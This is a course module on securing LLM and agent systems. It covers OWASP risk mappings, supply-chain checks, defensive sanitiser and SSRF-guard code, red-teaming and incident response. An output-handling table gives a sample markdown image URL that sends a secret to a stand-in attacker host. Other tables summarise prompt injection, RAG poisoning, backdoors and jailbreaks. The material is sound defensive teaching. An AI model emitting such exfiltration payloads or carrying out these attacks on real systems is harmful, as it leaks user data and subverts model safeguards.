# 07.02 — AI Security

> **Module 7: Safety** · Subtopic 2 of 3
> **Prerequisites:** application security fundamentals (OWASP Top 10, authN/authZ, SSRF, injection), 03.03 (data layer, ACLs), 05.01 (tool runtime), 05.04–05.05 (MCP/A2A security), 06.04 (tracing and audit).
> **Outcome:** you can threat-model an LLM or agent system end to end, map its risks to the **OWASP Top 10 for LLM Applications (2025)** and the **OWASP Top 10 for Agentic Applications (2026)**, and implement the controls that matter most: supply-chain integrity, output handling, least privilege, resource limits, data-poisoning defences, secure serving. You can also run red-team and incident-response programmes for AI features.

> **Scope:** 07.01 covers guardrails (behavioural policy). 07.03 goes deep on prompt injection. This subtopic covers **system security**: everything around the model that attackers actually exploit.

---

## 1. Threat Modelling LLM Systems

### 1.1 Assets, trust boundaries, attackers

```
                 ┌──────────────── TRUST BOUNDARY: your platform ────────────────────────────────┐
  end users ───► │ API gateway ─► orchestrator/agent ─► model provider / self-hosted inference   │
  (authn'd,      │      │               │    ▲                                                  │
   untrusted     │      │               │    └── system prompts, few-shot, policies (assets)   │
   input)        │      ▼               ▼                                                        │
                 │  rate limits    tools (MCP) ─► internal APIs, DBs, email, file stores (assets)│
                 │                      │                                                       │
                 │                 retrieval ─► vector/search index ◄── ingestion ◄── documents │
                 └──────────────────────┼───────────────────────────────────────────▲──────────┘
                                        ▼                                           │
                        external content (web, email, partner agents, 3rd-party MCP) — UNTRUSTED
  supply chain: model weights, tokenizers, Python/Java deps, datasets, MCP servers, prompts — MUST BE VERIFIED
```

**Assets:** user data and PII; confidential documents (e.g. unreleased drafts); credentials and tokens; system prompts and business logic; model weights (if self-hosted); compute budget; the integrity of outputs (legal accuracy); the organisation's reputation.

**Attackers:** external users (direct manipulation), content authors (indirect injection via documents, web pages, emails), malicious or compromised third-party components (MCP servers, packages, models), insiders, and resource abusers (denial of wallet).

**Method:** STRIDE per component and data flow, plus the LLM-specific lists below. For every threat, record the control, where it's enforced (code, not prompts), and the test that proves it.

### 1.2 OWASP Top 10 for LLM Applications (2025) → controls

| ID | Risk | Primary controls (module refs) |
|---|---|---|
| LLM01 | Prompt Injection | Architectural containment, taint/approval, spotlighting, detection (07.03, 02.01 §6) |
| LLM02 | Sensitive Information Disclosure | ACL-filtered retrieval (03.03 §6), output PII rails (07.01), no secrets in prompts |
| LLM03 | Supply Chain | Model/dependency provenance, safetensors, signing, pinned MCP servers (§2, 05.04 §7) |
| LLM04 | Data and Model Poisoning | Source-gated ingestion and memory writes (05.03 §4), dataset provenance, anomaly checks (§3) |
| LLM05 | Improper Output Handling | Treat output as untrusted: sanitise Markdown/HTML, SQL/URL guards (§4) |
| LLM06 | Excessive Agency | Least-privilege tools, user-scoped credentials, approvals (05.01, 05.06) |
| LLM07 | System Prompt Leakage | Assume prompts leak: no secrets or authZ logic in prompts (§5) |
| LLM08 | Vector and Embedding Weaknesses | Tenant isolation, ACL filters, poisoning-resistant ingestion, inversion awareness (03.01 §6.3, 03.03) |
| LLM09 | Misinformation | Grounding, citations, abstention, human review (04.03, 07.01 §5, 05.06) |
| LLM10 | Unbounded Consumption | Token/cost budgets, rate limits, input caps, loop detection (§6, 05.02 §3) |

### 1.3 OWASP Top 10 for Agentic Applications (2026) → controls

| ID | Risk | Primary controls |
|---|---|---|
| ASI01 | Agent Goal Hijack | Plan-then-execute and taint policies (07.03); approvals for consequential actions |
| ASI02 | Tool Misuse | Per-tool authZ, argument validation, allowlists, rate limits (05.01 §4) |
| ASI03 | Identity & Privilege Abuse | Delegated user identity, no token passthrough, scoped credentials (05.04 §4) |
| ASI04 | Agentic Supply Chain Vulnerabilities | Registry, pinning, scanning of tools/servers/agents (05.04 §7–8, 05.05 §5) |
| ASI05 | Unexpected Code Execution | Sandboxes (gVisor/Firecracker), no network by default, resource limits |
| ASI06 | Memory & Context Poisoning | Memory write gates, provenance, probation (05.03 §4) |
| ASI07 | Insecure Inter-Agent Communication | mTLS/OAuth, signed agent cards, hop limits (05.05 §5) |
| ASI08 | Cascading Failures | Budgets, circuit breakers, validation between agents (05.02 §7) |
| ASI09 | Human-Agent Trust Exploitation | Review UX that shows evidence and diffs, canaries against rubber-stamping (05.06 §5) |
| ASI10 | Rogue Agents | Monitoring, kill switches, least privilege, audit trails (06.04) |

Also map the threats to **MITRE ATLAS** techniques for red-team planning, and to **NIST AI 100-2** (adversarial ML taxonomy) for terminology.

---

## 2. Supply-Chain Security

| Component | Risk | Controls |
|---|---|---|
| **Model weights** | Malicious serialisation (pickle executes code on load), trojaned or backdoored weights | **safetensors only**; scan any legacy pickles (below); verify hashes and **signatures** (e.g. OpenSSF model signing with Sigstore); trusted registries; evaluate before promotion |
| **Tokenizers / configs / chat templates** | Template changes silently alter behaviour; malicious Jinja | Pin revisions; checksum; review template diffs (01.03 §8) |
| **Python/Java dependencies** | Typosquatting, compromised packages | Lockfiles with hashes, private mirrors, SCA scanning, SBOM |
| **Datasets** (fine-tuning, eval, RAG corpora) | Poisoning, licence and PII issues | Provenance, dataset hashes (06.02 §7), anomaly and duplicate checks |
| **MCP servers / tools / partner agents** | Tool poisoning, rug pulls, over-privilege | Registry, definition pinning, scanning, sandboxing (05.04 §7) |
| **Prompts** | Unreviewed changes shift behaviour | Prompts in version control with review and eval gates (02.01 §7.3) |

Produce an **AI-BOM** (e.g. a CycloneDX ML-BOM) listing models, datasets, prompts, tools, and their versions and hashes. Tie it to deploy artifacts so that any incident can answer "what exactly was running?".

```python
import hashlib
import io
import pickletools

SAFE_GLOBALS = {("collections", "OrderedDict"), ("torch._utils", "_rebuild_tensor_v2"), ("torch", "FloatStorage")}


def pickle_imports(data: bytes) -> set[tuple[str, str]]:
    """Static scan of a pickle stream for imported globals (never unpickle untrusted data to inspect it)."""
    found, strings = set(), []
    for op, arg, _ in pickletools.genops(io.BytesIO(data)):
        if op.name in ("SHORT_BINUNICODE", "BINUNICODE", "UNICODE", "STRING", "BINSTRING", "SHORT_BINSTRING"):
            strings.append(arg)
        elif op.name == "GLOBAL":
            mod, name = arg.split(" ", 1)
            found.add((mod, name))
        elif op.name == "STACK_GLOBAL" and len(strings) >= 2:
            found.add((strings[-2], strings[-1]))
    return found


def scan_pickle(data: bytes, allow: set[tuple[str, str]] = SAFE_GLOBALS) -> dict:
    imports = pickle_imports(data)
    bad = sorted(i for i in imports if i not in allow)
    return {"imports": sorted(imports), "disallowed": bad, "safe": not bad}


def verify_artifact(path_bytes: bytes, expected_sha256: str) -> bool:
    return hashlib.sha256(path_bytes).hexdigest() == expected_sha256
```

---

## 3. Data and Model Attacks

| Attack | Mechanism | Relevance | Defences |
|---|---|---|---|
| **Training/fine-tuning data poisoning & backdoors** | Crafted samples implant triggers; backdoors can persist through safety training (Sleeper Agents) | Fine-tuning on scraped or user data | Provenance, deduplication, outlier and anomaly detection, trigger scanning, eval on held-out and red-team sets, trusted base models |
| **RAG / knowledge poisoning** | Injected documents engineered to be retrieved and to steer answers (PoisonedRAG) | Any open or semi-open corpus | Source trust tiers and allowlists, ingestion review, per-source authority in ranking (04.02 §4), citation display, anomaly detection on new documents |
| **Memory poisoning** | Stored malicious instructions or facts (05.03 §4) | Agents with long-term memory | Write gates, provenance, probation |
| **Training data extraction / memorisation** | Prompting a model to regurgitate its training data | Fine-tuned models on sensitive data | Dedupe and PII-scrub training data, differential privacy where feasible, output PII rails |
| **Membership inference** | Inferring whether a record was in the training data | Models trained on personal data | Regularisation, DP, access limits |
| **Embedding inversion** | Reconstructing text from vectors (03.01 §6.3) | Vector DBs with sensitive text | Treat vectors as sensitive data; access control, encryption |
| **Model extraction** | Querying to replicate a model or recover parameters | Self-hosted proprietary models | Rate limits, query monitoring, output restrictions (e.g. no full logprobs) |
| **Jailbreaks** | Adversarial prompts defeating safety training (universal suffixes, role-play, multi-turn escalation) | Any exposed model | Layered guardrails (07.01), policy-aware classifiers, containment of consequences, monitoring |

**Key design point:** for most LLM *applications*, the dominant data risks are **RAG and memory poisoning** plus **sensitive-data disclosure through retrieval**, not training-time attacks. Put your effort where your architecture actually exposes you.

---

## 4. Improper Output Handling: Treat Model Output as Untrusted Input

Model output is attacker-influenceable (07.03). Every sink that consumes it needs **context-appropriate encoding and validation**, exactly as for user input.

| Sink | Attack | Control |
|---|---|---|
| **Markdown/HTML rendering** | XSS; **data exfiltration via image URLs** (`![x](https://attacker/?q=<secret>)` loads automatically) | Sanitise HTML; allowlist image and link hosts; never auto-load external images from model output; CSP headers |
| **SQL** | Injection, destructive statements | Parse and validate (read-only, table allowlist, LIMIT), a read-only DB role (02.04, 04.05 §4.3) |
| **Shell / code execution** | Command injection, escapes | Sandboxes; no shell string interpolation; allowlisted commands |
| **URLs fetched by tools** | **SSRF** (internal metadata endpoints, internal services) | Scheme allowlist; resolve and block private, loopback, and link-local ranges; egress proxy |
| **Emails / messages** | Phishing content, exfiltration | Approval gates (05.06), recipient allowlists, DLP scanning |
| **File paths** | Path traversal | Canonicalise; restrict to sandbox roots |

```python
import ipaddress
import re
from urllib.parse import urlparse

import sqlglot
from sqlglot import exp

MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)(?:\s+\"[^\"]*\")?\)")
MD_LINK = re.compile(r"(?<!!)\[([^\]]+)\]\(([^)\s]+)\)")
HTML_TAG = re.compile(r"<\s*/?\s*(script|iframe|img|object|embed|style|link|meta)[^>]*>", re.I)


def _host_ok(url: str, allowed_hosts: set[str]) -> bool:
    u = urlparse(url)
    return u.scheme in ("https",) and (u.hostname or "") in allowed_hosts


def sanitize_markdown(md: str, allowed_hosts: set[str]) -> str:
    md = HTML_TAG.sub("", md)
    md = MD_IMAGE.sub(lambda m: m.group(0) if _host_ok(m.group(2), allowed_hosts) else f"[image removed: {m.group(1)}]", md)
    md = MD_LINK.sub(lambda m: m.group(0) if _host_ok(m.group(2), allowed_hosts) else f"{m.group(1)} (external link removed)", md)
    return md


def guard_sql(sql: str, allowed_tables: set[str], max_limit: int = 500) -> str:
    stmts = sqlglot.parse(sql, read="postgres")
    if len(stmts) != 1 or stmts[0] is None:
        raise ValueError("exactly one statement required")
    tree = stmts[0]
    if not isinstance(tree, exp.Select):
        raise ValueError(f"only SELECT allowed, got {type(tree).__name__}")
    for node in tree.walk():
        if isinstance(node, (exp.Insert, exp.Update, exp.Delete, exp.Drop, exp.Create, exp.Alter, exp.Command)):
            raise ValueError("write/DDL operation found")
    ctes = {c.alias_or_name.lower() for c in tree.find_all(exp.CTE)}
    tables = {t.name.lower() for t in tree.find_all(exp.Table)} - ctes
    if not tables <= allowed_tables:
        raise ValueError(f"tables not allowed: {sorted(tables - allowed_tables)}")
    limit = tree.args.get("limit")
    if limit is None or int(limit.expression.name) > max_limit:
        tree = tree.limit(max_limit)
    return tree.sql(dialect="postgres")


def safe_fetch_target(url: str, resolve, allowed_schemes=("https",)) -> tuple[bool, str]:
    """resolve(host) -> list of IP strings (inject your DNS resolver; re-check the IP at connect time)."""
    u = urlparse(url)
    if u.scheme not in allowed_schemes or not u.hostname:
        return False, "scheme or host not allowed"
    for ip in resolve(u.hostname):
        addr = ipaddress.ip_address(ip)
        if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved or addr.is_multicast:
            return False, f"blocked internal address {ip}"
    return True, "ok"
```

**Note on SSRF:** check the resolved IP at *connect* time as well (DNS rebinding), or route all agent egress through a proxy that enforces the policy.

---

## 5. Secrets, Prompts, and Access Control

- **Assume the system prompt will leak.** Never put credentials, internal URLs you rely on for security, or authorisation logic ("only tell admins about X") in prompts. Enforce authorisation in code and data filters (03.03 §6).
- **Secrets never enter the model context.** Tools receive credentials from a secrets manager at execution time. The model sees only handles.
- **User-delegated identity** for all tool and data access (OAuth on-behalf-of; 05.04 §4). Agents do not get standing super-user credentials.
- **Tenant isolation** at every layer: retrieval filters, caches (04.02 §7), memory namespaces, logs.
- **Audit everything**: who asked, what was retrieved, which tools ran with which argument hashes, and what was returned (06.04).

---

## 6. Unbounded Consumption (Denial of Wallet)

LLM calls are expensive, and agents can loop. Attackers (or bugs) can burn budgets or degrade service for everyone.

**Controls:**
- **Per-user and per-tenant budgets** in tokens *and* currency, enforced before each call.
- **Input size caps** (prompt tokens, file sizes, number of attachments).
- **Output caps** (`max_tokens`).
- **Agent step and tool budgets** with loop detection (05.02 §3).
- **Concurrency limits** per user.
- **Anomaly alerts** on spend velocity.

```python
import time


class CostBucket:
    """Token bucket denominated in dollars: capacity = burst budget, refill = sustained $/second."""

    def __init__(self, capacity_usd: float, refill_usd_per_s: float):
        self.capacity, self.rate = capacity_usd, refill_usd_per_s
        self.level, self.t = capacity_usd, time.monotonic()

    def _refill(self):
        now = time.monotonic()
        self.level = min(self.capacity, self.level + (now - self.t) * self.rate)
        self.t = now

    def try_spend(self, estimated_usd: float) -> bool:
        self._refill()
        if estimated_usd <= self.level:
            self.level -= estimated_usd
            return True
        return False

    def settle(self, estimated_usd: float, actual_usd: float):
        """After the call, correct for the actual cost (refund or charge the difference)."""
        self.level = min(self.capacity, self.level + estimated_usd - actual_usd)
```

---

## 7. Secure Serving Infrastructure (Self-Hosted Models)

- **Inference endpoints are internal services:** authentication (mTLS or service tokens), Kubernetes network policies, no public exposure of vLLM/SGLang admin APIs.
- **Isolation:** separate namespaces or node pools for different trust levels. Be cautious with GPU sharing across tenants (side channels, memory remanence); prefer dedicated GPUs for sensitive workloads.
- **Model artefact integrity:** verify hashes and signatures at load time (§2), with read-only model volumes.
- **Resource limits and autoscaling guards** so that one tenant can't exhaust the GPUs.
- **Logging hygiene:** prompts and outputs in logs are sensitive data (06.04 §3).

---

## 8. Red Teaming and Incident Response

### 8.1 Red-team programme

1. **Scope** from the threat model: assets, entry points, and high-impact actions.
2. **Automated scanning** (garak, PyRIT, promptfoo red-team suites) in CI against staging, for known attack classes.
3. **Manual, adaptive red-teaming** before launches and after major changes. Human attackers find what scanners miss (07.03 §2).
4. **Measure:** attack success rate by category, time to compromise, and the effectiveness of the controls. Every finding becomes a regression test (06.01 §6).
5. **Bug bounty or disclosure channel** for external reports.

### 8.2 AI incident response playbook (skeleton)

| Phase | Actions |
|---|---|
| **Detect** | Alerts from guardrails, anomaly monitors (06.03), user reports, audit-log queries |
| **Contain** | Kill switch for the affected tool, agent, or model route; revoke or rotate credentials; block the offending sources or documents; disable memory writes |
| **Preserve** | Freeze traces, cassettes, prompts, index snapshots, and model versions (06.04 §4) |
| **Eradicate** | Remove poisoned documents and memories; patch prompts, policies, or code; re-index |
| **Recover** | Staged re-enable with heightened monitoring; eval gates |
| **Learn** | Post-incident review; new eval cases, new controls, threat-model update |

---

## 9. Production Challenges & How to Solve Them

| Challenge | Symptom | Fix |
|---|---|---|
| **Security via prompts** | "The system prompt says don't reveal X" — it leaks | Enforce in code, data filters, and tool permissions; assume prompts are public |
| **Exfiltration via rendered output** | Data leaves in image or link URLs | Markdown/HTML sanitisation with host allowlists; CSP; no auto-loading of external images |
| **Over-privileged agents** | One injection reaches everything | Least privilege, user-delegated tokens, per-tool scopes, approvals |
| **Unsafe model loading** | Code execution from model files | safetensors only; pickle scanning; signature verification |
| **Poisoned knowledge** | Answers steered by planted documents | Source trust tiers, ingestion review, authority-aware ranking, monitoring of new sources |
| **Denial of wallet** | Cost spikes | Cost buckets, caps, loop detection, spend anomaly alerts |
| **SSRF through tools** | Internal endpoints reached | URL guards with resolved-IP checks; an egress proxy |
| **No incident readiness** | Slow, chaotic response | Playbooks, kill switches, trace preservation, drills |

---

## 10. Hands-On Projects

### Project 1 — Threat Model and Security Review of the Legislative Assistant

**User stories**
- *As the security architect*, I need a documented, tested threat model for the assistant (RAG + tools + MCP + agents), so that we can prioritise controls and satisfy governance reviews.

**Acceptance criteria**
1. A data-flow diagram with trust boundaries covering the users, API, agent, model providers, MCP servers, retrieval indexes, ingestion, memory, and external content.
2. A STRIDE analysis per element, plus mappings to OWASP LLM 2025 (LLM01–10) and Agentic 2026 (ASI01–10), with likelihood, impact, and existing vs planned controls.
3. For each high-risk threat: the control *location* (code, config, infrastructure — not prompts) and an automated test proving it (e.g. an ACL-bypass test, a markdown-exfiltration test, an SSRF test, a cost-limit test).
4. A MITRE ATLAS-based red-team plan and the results of one exercise.
5. Sign-off artefacts: the threat-model document, the control matrix, and the test evidence in CI.

**Step-by-step**
1. Map the architecture and data flows (from your Modules 3–6 projects).
2. Run STRIDE and OWASP mapping workshops; score the risks.
3. Implement the missing controls; write the tests.
4. Execute the red-team plan (automated plus manual); fix the findings; add regression tests.
5. Publish the document, and schedule reviews on architecture changes.

---

### Project 2 — Output-Handling Hardening with Fuzzing

**User stories**
- *As a platform engineer*, I want every place that consumes model output (UI rendering, SQL, URL fetching, file paths, emails) to be safe even when the output is adversarial.

**Acceptance criteria**
1. Sanitisers and guards: `sanitize_markdown` (plus an HTML sanitiser such as bleach or DOMPurify on the client), `guard_sql` (sqlglot + a read-only role), `safe_fetch_target` (+ connect-time IP checks via an egress proxy), path canonicalisation, and recipient allowlists.
2. **Property-based and fuzz tests** (Hypothesis) generating adversarial outputs: nested Markdown, HTML-entity tricks, Unicode homoglyph hosts, SQL comment and stacked-query tricks, DNS-rebinding simulation, `../` variants.
3. Integration tests in which a mocked "malicious model" returns crafted outputs through the real rendering and tool paths. There must be zero successful exfiltrations or unsafe executions.
4. A CSP policy for the web client, with no inline scripts and restricted image sources.
5. A documented sink inventory with the owning control per sink.

**Step-by-step**
1. Inventory all the output sinks in the codebase.
2. Implement or adopt the sanitisers; route every sink through them.
3. Write the Hypothesis strategies and the fuzz harnesses; fix what they find.
4. Build the malicious-model integration tests.
5. Deploy the CSP and the egress proxy; verify them in staging.

---

### Project 3 — Model and Dependency Supply-Chain Pipeline

**User stories**
- *As an MLOps lead*, I want only verified, scanned, and documented models, tokenizers, prompts, and packages to reach production, with an AI-BOM for every deployment.

**Acceptance criteria**
1. The CI pipeline rejects non-safetensors weights (or scans legacy pickles with `scan_pickle` and blocks disallowed imports), verifies SHA-256 hashes against a registry, and verifies signatures (Sigstore / OpenSSF model signing).
2. Pinned tokenizer, config, and chat-template revisions, with a diff review required for changes.
3. Dependency lockfiles with hashes, a private mirror, and SCA scanning that fails the build on critical CVEs.
4. An AI-BOM (CycloneDX) generated per deployment (models, datasets, prompts, MCP servers, versions, hashes), stored with the release.
5. A drill: introduce a tampered model file and a typosquatted package into a PR — both are blocked, with clear errors.

**Step-by-step**
1. Stand up an internal model registry (object storage + metadata DB), with hashes and signatures.
2. Implement the verification steps as CI jobs (GitHub Actions / GitLab CI).
3. Configure the dependency hygiene tooling.
4. Generate the AI-BOM from the deployment manifests.
5. Run the drill, and document it.

---

## 11. Foundational Papers & Standards (exact titles)

**Frameworks and standards**
- OWASP — *Top 10 for LLM Applications 2025*; OWASP GenAI Security Project — *OWASP Top 10 for Agentic Applications* (2026 edition, published Dec 2025)
- MITRE — *ATLAS: Adversarial Threat Landscape for Artificial-Intelligence Systems*
- NIST — *AI 100-2 E2025: Adversarial Machine Learning: A Taxonomy and Terminology of Attacks and Mitigations*
- NIST — *AI 600-1: Artificial Intelligence Risk Management Framework: Generative Artificial Intelligence Profile*
- CISA et al. — *Deploying AI Systems Securely* (joint guidance)

**Attacks on models and data**
- Carlini et al., 2021 — *Extracting Training Data from Large Language Models*
- Nasr et al., 2023 — *Scalable Extraction of Training Data from (Production) Language Models*
- Carlini et al., 2024 — *Stealing Part of a Production Language Model*
- Shokri et al., 2017 — *Membership Inference Attacks Against Machine Learning Models*
- Carlini et al., 2023 — *Poisoning Web-Scale Training Datasets is Practical*
- Hubinger et al., 2024 — *Sleeper Agents: Training Deceptive LLMs that Persist Through Safety Training*
- Zou et al., 2024 — *PoisonedRAG: Knowledge Corruption Attacks to Retrieval-Augmented Generation of Large Language Models*
- Zou et al., 2023 — *Universal and Transferable Adversarial Attacks on Aligned Language Models*
- Wei, Haghtalab & Steinhardt, 2023 — *Jailbroken: How Does LLM Safety Training Fail?*
- Morris et al., 2023 — *Text Embeddings Reveal (Almost) As Much As Text*

## 12. Essential Tooling

| Tool | Role |
|---|---|
| **garak, PyRIT, promptfoo red-team** | Automated LLM vulnerability scanning |
| **safetensors, modelscan / picklescan**, **OpenSSF model-signing (Sigstore)** | Safe model formats, scanning, signing |
| **CycloneDX (ML-BOM), Syft/Grype, Dependabot/Snyk** | SBOM/AI-BOM, dependency scanning |
| **sqlglot**, **bleach / DOMPurify**, egress proxies | Output-handling guards |
| **OPA / Cedar** | Policy-as-code for tool and data authorisation |
| **HashiCorp Vault / cloud secret managers** | Secrets outside model context |
| **gVisor / Firecracker / Kubernetes network policies** | Sandboxing and isolation |
